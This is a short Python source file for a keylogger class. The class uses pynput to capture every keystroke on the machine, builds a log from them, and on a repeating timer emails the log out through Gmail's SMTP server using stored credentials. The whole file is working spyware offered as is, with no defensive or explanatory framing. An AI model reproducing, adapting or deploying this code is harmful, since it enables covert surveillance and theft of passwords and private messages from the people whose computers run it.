#!/usr/bin/env python

import pynput.keyboard as keyboard
import smtplib, threading


class Keylogger:

	def __init__(self, time_interval, email, password):
		self.log = "Keylogger started"
		self.interval = time_interval
		self.email = email
		self.password = password

	def append_to_log(self, string):
		self.log = self.log + string

	def send_mail(self,email, password, message):
		smtp_server = smtplib.SMTP("smtp.gmail.com",587)
		smtp_server.starttls()
		smtp_server.login(email,password)
		smtp_server.sendmail(email, email, message)
		smtp_server.quit()

	def process_press(self,key):
		current_key = str(key)
		try:
			if key == key.space:
				current_key = " "
			else:	
				current_key = str(key).replace("'","")
		except AttributeError:
			current_key = str(key).replace("'","")
		self.append_to_log(current_key)

	def report(self):
		#Double \n at start of log so that the log is always printed
		#in the message box instead of the subject box
		self.send_mail(self.email,self.password,"\n\n" + self.log)
		self.log = ""
		timer = threading.Timer(self.interval, self.report)
		timer.start()

	def start(self):
		keyboard_listener = keyboard.Listener(on_press=self.process_press)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()

